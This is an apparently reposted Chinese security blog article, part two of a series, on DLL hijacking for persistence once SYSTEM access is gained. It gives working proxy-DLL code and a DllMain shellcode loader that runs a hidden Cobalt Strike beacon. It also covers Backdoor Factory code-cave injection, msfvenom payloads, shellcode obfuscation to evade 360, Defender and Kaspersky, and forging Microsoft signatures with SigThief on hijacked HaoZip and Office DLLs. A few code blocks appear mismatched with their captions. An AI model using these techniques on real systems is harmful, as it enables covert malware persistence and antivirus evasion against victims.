> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ft74zSP5SIVZn56xQxm5sA)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4iaCGNJnxCgicxGTytmR6AmbrXTEsfXNe3lF8ibqN9MbciaV2EJD6tqJiaug/640?wx_fmt=png)

本系列:[DLL 劫持原理及其漏洞挖掘（一）](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737096&idx=1&sn=582fb5d65201dc7b6d47b249d485a6c0&chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&scene=21#wechat_redirect)

**0×0**

  

**前言**

最近发现针对某些目标，添加启动项，计划任务等比较明显的方式效果并不是很好，所以针对 DLL 劫持从而达到权限的维持的技术进行了一番学习，希望能与读者们一起分享学习过程，然后一起探讨关于 DLL 更多利用姿势。

**0×1**

  

**背景**

原理在第一篇已经讲了，下面说说与第一篇的不同之处，这一篇的技术背景是, 我们已经获取到 system 权限的情况下，然后需要对目标进行持续性的控制，所以需要对权限进行维护，我们的目标是针对一些主流的软件 or 系统内置会加载的小 DLL 进行转发式劫持 (也可以理解为中间人劫持), 这种劫持的好处就是即使目标不存在 DLL 劫持漏洞也没关系，我们可以采取直接替换掉原来的 DLL 文件的方式，效果就是，程序依然可以正常加载原来 DLL 文件的功能，但是同时也会执行我们自定义的恶意操作。
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**0×2**

  

**劫持的优势**

在很久以前,” 白 + 黑” 这种免杀方式很火, DLL 劫持的优势其实就是如此。  

是不是很懵? 先理解下什么是” 白”+” 黑”

> 白加黑木马的结构  
> 1.Exe(白) —-load—-> dll（黑）  
> 2.Exe(白) —-load—-> dll（黑）—-load—-> 恶意代码

白 EXE 主要是指那些带有签名的程序 (杀毒软件对于这种软件，特别是 window 签名的程序，无论什么行为都不会阻止的, 至于为什么？emmm, 原因很多, 查杀复杂，定位 DLL 困难，而且最终在内存执行的行为都归于 exe(如果能在众多加载的 DLL 中准确定位到模块，那就是 AI 分析大师。), 所以比较好用的基于特征码去查杀，针对如今混淆就像切菜一样简单的时代来说，蛮不够看的，PS. 或许 360 等杀毒有新的方式去检测, emmm, 不过我实践发现, 基于这个原理过主动防御没啥问题… emmm)

关于这个优势，上图胜千言。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4v4qXOUDa6Tk7YWc9xwTaTHM2TDicg2nmTBpbmoezABUrFicibCuZOxauQ/640?wx_fmt=png)

> 基于 wmic,rundll,InstallUtil 等的白名单现在确实作用不是很大。

**0×3**

  

**劫持方式**

为了能够更好地学习, 下面方式, 笔者决定通过写一个 demo 的程序进行测试。  

打开 vs2017, 新建一个控制台应用程序:

代码如下:

```
#include <iostream>
#include <Windows.h>
using namespace std;

int main()
{
    // 定义一个函数类DLLFUNC
    typedef void(*DLLFUNC)(void);
    DLLFUNC GetDllfunc1 = NULL;
    DLLFUNC GetDllfunc2 = NULL;
    // 指定动态加载dll库
    HINSTANCE hinst = LoadLibrary(L"TestDll.dll");
    if (hinst != NULL) {
        // 获取函数位置
        GetDllfunc1 = (DLLFUNC)GetProcAddress(hinst, "msg");
        GetDllfunc2 = (DLLFUNC)GetProcAddress(hinst, "error");
    }
    if (GetDllfunc1 != NULL) {
        //运行msg函数
        (*GetDllfunc1)();
    }
    else {
        MessageBox(0, L"Load msg function Error,Exit!", 0, 0);
        exit(0);
    }
    if (GetDllfunc2 != NULL) {
        //运行error函数
        (*GetDllfunc2)();
    }
    else {
        MessageBox(0, L"Load error function Error,Exit!", 0, 0);
        exit(0);
    }
    printf("Success");
}
```

程序如果缺乏指定 DLL 的导出函数, 那么将会失败.

原生正常 DLL 的代码如下:

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>

void msg() {
    MessageBox(0, L"I am msg function!", 0, 0);
}

void error() {
    MessageBox(0, L" I am error function!", 0, 0);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

framework.h 导出函数如下:

```
#pragma once

#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include <windows.h>

extern "C" __declspec(dllexport) void msg(void);
extern "C" __declspec(dllexport) void error(void);
```

> extern 表示这是个全局函数, 可以供其他函数调用,”C” 表示按照 C 编译器的方式编译
> 
> __declspec(dllexport) 这个导出语句可以自动生成. def((符号表)), 这个很关键
> 
> 如果你没导出, 这样调用的程序是没办法调用的 (其实也可以尝试从执行过程来分析，可能麻烦点)
> 
> 建议直接看官方文档:
> 
> https://docs.microsoft.com/zh-cn/cpp/build/exporting-from-a-dll?view=msvc-160

正常完整执行的话, 最终程序会输出 Success。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4xkLmgXpRbSPVkZict83QENyL5ZqMmYIxEb0rnEzZlWrx5ibA23Cu3rFg/640?wx_fmt=png)

下面将以这个 hello.exe 的 demo 程序来学习以下三种劫持方式。

### **0x3.1 转发式劫持**

这个思想可以简单理解为

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4gH9D8ZY8W8QeHJfMY1h0VicicHh13gTicadds3619WkkleNPNhRH05hZw/640?wx_fmt=png)

这里我本来打算安装一个工具 DLLHijacker, 但是后来发现历史遗留，不支持 64 位等太多问题，最终放弃了，转而物色到了一款更好用的工具 AheadLib:

这里有两个版本, 有时候可能识别程序位数之类的问题出错可以尝试切换一下:

AheadLib-x86-x64 Ver 1.2

yes 大牛的修改版

yes 大牛中的修改版提供两种直接转发函数即时调用函数

> 区别就是直接转发函数，我们只能控制 DllMain 即调用原 DLL 时触发的行为可控
> 
> 即时调用函数，可以在处理加载 DLL 时，调用具体函数的时候行为可控，高度自定义触发点, 也称用来 hook 某些函数，获取到参数值。

这里为了简单点，我们直接采取默认的直接转发就行了。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4LdMQH2JYtaJCVYNVVzCSEhjtmSibGZBu4mpkIcpmTfIQzIsDfGT51mg/640?wx_fmt=png)

生成 TestDll.cpp 文件之后，我们在 VS 新建动态链接库项目，将文件加载进项目。

记得要保留原来的 #include "pch.h"

然后替换其他内容为生成 TestDLL.cpp 就行, 这里我们在

DLL_PROCESS_ATTACH 也就 DLL 被加载的时候执行, 这里我们设置的 demo 弹窗

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 头文件
#include <Windows.h>
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


// 这里是转发的关键,通过将error转发到TestDllOrg.error中
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 导出函数
#pragma comment(linker, "/EXPORT:error=TestDllOrg.error,@1")
#pragma comment(linker, "/EXPORT:msg=TestDllOrg.msg,@2")
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        MessageBox(NULL, L"hi,hacker, inserted function runing", L"hi", MB_OK);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {

    }

    return TRUE;
}
///////////////////////////////////////////////////////////
```

效果如下:

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4lOQn9exiaVP6FLOOX7Vt2gv8bIxsGfNUqFsC0431tU439OFNcL3Z9uQ/640?wx_fmt=png)

后面的功能也是正常调用的, 不过这个需要注意的地方就是加载的程序和 DLL 的位数必须一样，要不然就会加载出错的, 所以劫持的时候需要观察下位数。

比如下面这个例子:

这里加载程序 hello.exe(64 位) 的, 加载 Test.dll(32 位) 就出错了。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4EOVHB4gga4osev65avb6ZgGSUGGfESVvmsIJ7iawCpjhptExte6U6Ng/640?wx_fmt=png)

### **0x3.2 篡改式劫持**

这种方法属于比较暴力的一种, 通过直接在 DLL 中插入跳转语句从而跳转到我们的 shellcode 位置，这种方式其实局限性蛮多的。

> 1. 签名的 DLL 文件会破坏签名导致失败
> 
> 2. 会修改原生 DLL 文件，容易出现一些程序错误
> 
> 3. 手法比较古老。

这种方式可以采用一个工具 BDF(好像以前 CS 内置这个???):

安装过程:

```
git clone https://github.com/secretsquirrel/the-backdoor-factory
sudo ./install.sh
```

> mac 下 3.0.4 的版本会出现 capstone 的错误.
> 
> 解决方案:
> 
> ```
> [*] Checking if binary is supported
> [*] Gathering file info
> [*] Reading win32 entry instructions
> ./exeTest/TestDll.dll is supported.
> ```

使用过程如下:

1. 首先查看是否支持:./backdoor.py -f ./exeTest/hello.exe -S

```
python2 backdoor.py -f TestDll.dll -c
```

2. 接着搜索是否存在可用的 Code Caves(需要可执行权限的 Caves 来存放 shellcode)

```
Looking for caves with a size of 380 bytes (measured as an integer
[*] Looking for caves
We have a winner: .text
->Begin Cave 0x1074
->End of Cave 0x1200
Size of Cave (int) 396
SizeOfRawData 0xe00
PointerToRawData 0x400
End of Raw Data: 0x1200
**************************************************
No section
->Begin Cave 0x1c15
->End of Cave 0x1e0e
Size of Cave (int) 505
**************************************************
[*] Total of 2 caves found
```

```
The following WinIntelPE32s are available: (use -s)
cave_miner_inline
iat_reverse_tcp_inline
iat_reverse_tcp_inline_threaded
iat_reverse_tcp_stager_threaded
iat_user_supplied_shellcode_threaded
meterpreter_reverse_https_threaded
reverse_shell_tcp_inline
reverse_tcp_stager_threaded
user_supplied_shellcode_threaded
```

这里在. text(代码段) 存在一个 396 字节大小区域.  

3. 获取可用的 payload

./backdoor.py -f ./exeTest/TestDll.dll -s

```
./backdoor.py -f ./exeTest/TestDll.dll -s user_supplied_shellcode_threaded -U msg.bin -a
```

这里我们采取最后一个选项:

user_supplied_shellcode_threaded

> 自定义 payload，payload 可通过 msf 生成

先生成测试的 shellcode:

calc 调用测试 193bytes：

msfvenom -p windows/exec CMD=calc.exe -f raw > calc.bin

msg 弹框测试 272bytes:

msfvenom -p windows/messagebox -f raw >msg.bin

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4vRXknRtM3HXYGjOtVQ5wf2UplOcCVI2iask0ic7RZMl7XA64vpTPaia4g/640?wx_fmt=png)

0x108+8 = 272 个字节

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4pdUGHDVcFA3sXYMa971NvZE16hF7oS47mrwZiccpNDS5g7fj25LStCg/640?wx_fmt=png)

不过除了 shellcode 还有跳转过程也需要字节，平衡栈等。

这里尝试注入:

```
git clone https://github.com/anhkgg/SuperDllHijack.git
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4PHV8ElQcGK6OW1rAd8zD5kZIr4fQ9ic1nkI20bIIMRBOsU4qX2iaibOSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4WO6SWAOrJVUsYXH9ibWZmdviamL86STpUdMCL3t25XhibjEKWKx8MGibQw/640?wx_fmt=png)

执行很成功, 但是在替换加载的时候, 发现计算器的确弹出来了, 但是主程序却出错异常退出了。

> 这种方式就是暴力 patch 程序入口点，jmp shellcode，然后继续向下执行，很容易导致堆栈不平衡, 从而导致程序错误，所以，效果不是很好, 期待 2021.7 月发布的新版，有空我也自己去尝试优化下，学学堆栈原理，如何去正确的 patch。

### **0x3.3 通用 DLL 劫持**

这种方式可以不再需要导出 DLL 的相同功能接口，实现原理其实就是修改 LoadLibrary 的返回值, 一般来说都是劫持 LoadLibraryW(L"mydll.dll");,window 默认都是转换为 unicode, 自己去跟一下也可以发现。

原理大概如下:

> exe —load—> fakedlld.ll —> execute shellcode
> 
> | 执行完返回正确 orgin.dll 地址 |
> 
> ——————————————————————

怎么实现这种效果?

使用这个工具: SuperDllHijack

```
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcess(TEXT("C:\\Users\\xq17\\Desktop\\shellcode\\beacon.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }

    return TRUE;
}
```

然后用 vs 加载其中的 example 部分就行了

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4I8uoQZbvxc90Y0kFy2NNst73iclvY7RgZ7KqNiau2zjibneyUa244v3ug/640?wx_fmt=png)

核心关键代码在这里, 这里我们修改成如下:

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4HIEjXVfG7ictXwUbd0CSEibu5lgxvcicZB44CD9dXYfNdvd0da282D5fQ/640?wx_fmt=png)

然后执行的时候, 发现虽然成功 hook 了

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4IOibMoFBplNYIt02Sd4RMOUD5IGXOu1BiabzHfekgNGPh17RMR75XvKQ/640?wx_fmt=png)

但是获取相应的导出函数, 也还是失败的, 而且很奇怪 realease 和 debug 编译的时候, release 版本连 demo 都在 win10 跑不起来。

### **0x3.4 总结**

经过上面的简单测试, 不难得出，无论是从简易性，实用性，操作性 (方便免杀) 来看，我都推荐新手使用第一种方式，缺点也有，就是可能导出函数比较多的时候，会比较麻烦，但是这些不是什么大问题。因为尽量能用微软提供的功能去解决，远远比自己去 patch 内存来更有效，可以避免很多隐藏机制，系统版本等问题的影响，通用性得到保证, 所以下面的操作我将会采取 AheadLib 来进行展示。

**0×4**

  

**DLL 后门的利用**

DLL 查杀, 其实也是针对 shellcode 的查杀, 下面先写一个简单的加载 shellcode 的恶意代码。  

### **0x4.1 多文件利用方法**

最简单的一种利用手段就是:

存放我的 cs 木马 beacon 到一个比较隐蔽的目录:

C:\Users\xq17\Desktop\shellcode\beacon.exe

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf41Xh2A6qnTAicXWMuY8HnSbCrT8AOCO4Lr0sHIGrvV38Z2bq6ZIPGfiaA/640?wx_fmt=png)

然后给这个文件加一个隐藏属性:

attrib +h beacon.exe

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4YD5tibzFQjmwYr2NibOyCMawI24BqR0ic1g2bPHJibYSBHrTUibAa7xrwgw/640?wx_fmt=png)

接着我们采用 DLL 去加载这个木马。

代码大概如下:

```
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        unsigned char buf[] = "shellcode";
        size_t size = sizeof(buf);
        char* inject = (char *)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(inject, buf, size);
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)inject, 0, 0, 0);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {
    }
    return TRUE;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
```

然后后面直接去尝试加载就行了, 程序执行完的时候 (DLL_PROCESS_DETACH), 会自动加载我们的 cs 马。

> 说一下这种方案的好处, 就是 DLL 根本没有恶意操作, 所以肯定会免杀，但是你的木马文件要做好免杀，这种思路主要应用于通过劫持一些程序的 DLL, 然后实现隐蔽的重启上线，也就是权限持续维持，单单杀启动项对 DLL 进行权限维持的方式来说是没有用的。

### **0x4.2 单 DLL 自加载上线**

上面可能步骤繁琐了些, 其实我们也可以直接将 shellcode 代码写入到 DLL 文件中, 然后加载 DLL 的时候执行就行了。

代码大概如下:

```
1.pip install distorm3
2.git clone https://github.com/kgretzky/python-x86-obfuscator.git
3.cd
```

加载 Hello32.exe 的时候，就会上线，如果 hello32 执行完自动退出的话, 那也挂掉的 (可以写一个自动迁移进程的来解决这个问题)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4Bs5Cq7WlPp7vRPLt76Sr2OicxweP68kCDia5sr85rUuDbG6klNCuzKVw/640?wx_fmt=png)

接下来查看一下杀毒软件报毒不:

一开始静态扫描肯定是可以的, 但是当我成功加载上线一次之后，再次查杀立马就被报毒。

后面发现上传鉴定的确也被杀了。(网上很多人说关掉上传 (秒天秒地免杀，这里就不做评价了),emmm, 360 都是默认开启上传功能的)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4X643jW6KNKLjdWv31f50r9k9tFAgtDBCDhicRt6dhQozWUJkfw3X0JQ/640?wx_fmt=png)

现在比较主流的就是自写加载器，加密 shellcode 之类的，但是效果越来越差了，然后现在慢慢倾向于 Python 语言、Golang、nim 等偏僻语言来调用 API，应该是杀软没跟上导致 bypass，但是这种技术没办法用在 DLL 的加载器中，除非用这种偏僻语言来生成 DLL。

这里我决定采用一些比较稀奇的方式。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4X643jW6KNKLjdWv31f50r9k9tFAgtDBCDhicRt6dhQozWUJkfw3X0JQ/640?wx_fmt=png)

通过注释掉 shellcode, 不难发现, 他是针对 shellcode 加了特征码来查杀的，云端估计会进行动态分析，然后扫描 shellcode 然后给 shellcode 加特征。

> 我的思路是对 shellcode 进行混淆

实现混淆目前我已知的两种方式:

1. 很老很大众的编码器, 以前效果贼 6 的 msf 也自带的 shikata_ga_nai，其原理是内存 xor 自解密。

2. 真正的等价替换 shellcode, 完全去除本身特征 (杀软加针对工具的特征，那就是另说了)

这里我介绍萌新都可以学会使用的第二种方法，原理方面的话，下次再展开与 shikata 一起来讲讲。

```
#!/usr/bin/env python3
shellcode = 'unsigned char buf[] = "'
with open("output1.bin", "rb") as f:
    content = f.read()
# print(content)
for i in content:
    shellcode += str(hex(i)).replace("0x", "\\x")
shellcode += '";'
print(shellcode)
```

然后 cs 生成 raw 的 payload.bin, 然后生成混淆

python x86obf.py -i payload.bin -o output.bin -r 0-184

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4N0aicaZzQozj3oVlJvTyzT9Rtaa2o2wKTtokf5h4CEaq4nyI7ibBj61A/640?wx_fmt=png)

> 关键一些点还是大致看出来

想要加强混淆，可以执行:

python x86obf.py -i payload.bin -o output.bin -r 0-184 -p 2 -f 10

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4ic8xpRYicwPfTADibRF31Jlm53wV5W2PzEX8qHYtXupMKnQccMIxHCjkA/640?wx_fmt=png)

> 可以看到非常恐怖了, 基本都不认识了, 但是体积也变大了很多

接着我们直接提取成 shellcode 的数组形式:

```
git clone https://github.com/secretsquirrel/SigThief.git
```

然后直接替换上面的 shellcode 就行，然后我们再来看一下效果:

> 基本可以免杀, 但是如果 360 上传云，很快就会被杀。解决方案就是: 被杀的时候，继续生成和替换 shellcode 就行了，每次都是随机混淆的，都可以起到免杀效果。
> 
> 同时 Wd 是可以过掉的, 卡巴斯基也是可以上线的，但是也仅仅是上线而已。

不过不用很担心免杀问题，毕竟是白 + 黑，我们劫持有签名的程序就可以降低被杀的概率。

就算发出来免杀代码照样会立刻被 AV 秒杀的，所以目的还是分享一些免杀想法, 希望大家发散思维，形成一套自己的免杀流程。

**0×5**

  

**证书签名伪造**

为什么需要伪造证书呢？  

因为有一些情况，一些杀软不会去检验证书签名是否有效，同时也能取到一定迷惑受害者的效果。

这里我们使用一个软件 SigThief:

> 原理: 它将从已签名的 PE 文件中剥离签名，并将其附加到另一个 PE 文件中，从而修复证书表以对该文件进行签名。

```
python3 sigthief.py -i VSTOInstallerUI.dll  -t TestDll.dll -o TestDllSign.dll
```

这里随便选一个微软签名的 DLL 进行伪造:

.assets/image-20210301124455700.png)

```
Get-AuthenticodeSignature .\TestDll.dll
```

不过签名是不正确的 (伪造):

```
python3 sigthief.py -i Haozip_2345UpgradeOrg.dll  -t Haozip_2345Upgradefake.dll -o Haozip_2345Upgrade.dll
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4SvDETHw5LWEbm0gSyp9ye7P7rFOyI5aLRMWiaO38noNs4IFyGdAMPZA/640?wx_fmt=png)

> 关于本地修改签名验证机制来 bypass，可以参考下这些文章
> 
> 数字签名劫持
> 
> Authenticode 签名伪造——PE 文件的签名伪造与签名验证劫
> 
> 但是这些点我感觉还是比较粗浅，还需继续深入研究，所以这里就不尝试，因为我觉得应该先从数字签名的原理和验证讲起，后面会慢慢接触到的。

**0×6**

  

**实操 DLL 持久权限维持**

下面用一个案例来组合上面思路。  

首先我们下载工具

https://download.sysinternals.com/files/ProcessExplorer.zip

https://download.sysinternals.com/files/Autoruns.zip

或者在任务管理器 -> 启动

然后在里面查找一些自动启动的程序。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4bpQ5Mq4wpkJ1JDoObbhqgTSDKFOL0yV5F84yic59LAG8SiaqUR3mt93w/640?wx_fmt=png)

然后开 ProcessMonitor 看加载的 DLL, 这里我默认排除系统的 DLL，要不然你的木马会不停被重复加载。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4e8GS9pMj8PJyic3qTtGhCtgKcdtMXibMibXU7wribLdMfXTLc3gkljyFYg/640?wx_fmt=png)

发现进行 Load_image, 只有这个

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4pqTK5KbaLH8icxgDceOmdiaSWtk1ZROWH9xFYKoZ1NqcWWApMucoYuBw/640?wx_fmt=png)

发现并不复杂只有一个导出函数:

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf44vlUSnOficMWkVX5icRLyANln4mCcoKn4o8YZDvTC2OMe7U6VzSWArZg/640?wx_fmt=png)

然后我们生成这个 Haozip_2345Upgradefake.dll 文件，将原来 DLL 改为: Haozip_2345UpgradeOrg.dll.

然后继续伪造签名:

```
Haozip_2345Upgrade.dll 
Haozip_2345UpgradeOrg.dll  //这个你也可以直接文件夹直接更换名字就行了。
```

最后将这个两个文件:

```
Haozip_2345Upgrade.dll 
Haozip_2345UpgradeOrg.dll  //这个你也可以直接文件夹直接更换名字就行了。
```

放回回原来的目录下即可。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4zSuhjF8iaOAibXeQicngaFyzXKNibnv44wTYGUSv9RmUA7NnuH7a6w1H0A/640?wx_fmt=png)

但是并没有成功，猜测程序加载 DLL 的时候检验了签名。

后面我尝试用上面的步骤，寻找了其他 office 来进行劫持.(这里直接用的是 64 位没有混淆的 shellcode)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6tiahSDOzibOQ5CE2vqU0sf4GIohOxLHZLLibvVsuKicCNcg6krePXuZEH5DmdWXPpric4jStD0cfMGow/640?wx_fmt=png)

成功劫持加载了。

**0×7**

  

**总结**

总体来说，这种权限维持方案操作比较复杂，要求也比较高，也相当费时和费力，不过如果手里有很多主流软件的加载 DLL 列表，然后自己存好备份，能提高不少安装该后门速度，现在就是自动化程度比较低，出错率高，可以继续深入研究下，寻找一种比较简单的指定 DLL 通用权限维持手段，这样这种技术才能很好的落地实战化。  

共勉吧，Windows 的编程和原理还需要继续深入学习…

（点击 “阅读原文” 查看链接）

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

```
- End -

精彩推荐
新型恶意软件通过后门瞄准Xcode开发者

【技术分享】如何高效的挖掘Java反序列化利用链？

【技术分享】明查OS实现UAC验证全流程—三个进程间的"情爱"[1]

【技术分享】恶意框架样本分析-从Veil到Msf


戳“阅读原文”查看更多内容
```